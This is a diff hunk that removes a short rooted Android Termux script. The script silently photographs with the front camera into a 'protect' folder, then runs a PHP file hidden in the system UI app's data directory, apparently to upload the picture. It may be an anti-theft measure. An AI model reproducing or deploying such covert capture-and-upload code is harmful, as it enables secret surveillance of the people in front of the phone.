@@ -1,4 +1,0 @@
-time=$(su -c "date +%d%m%Y%H%M%S")
-su -c "termux-camera-photo -c 1 /sdcard/protect/$time.png"
-sleep 15
-su -c "env LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib /data/data/com.termux/files/usr/bin/php /data/data/com.android.systemui/files/vkup.php $time"а
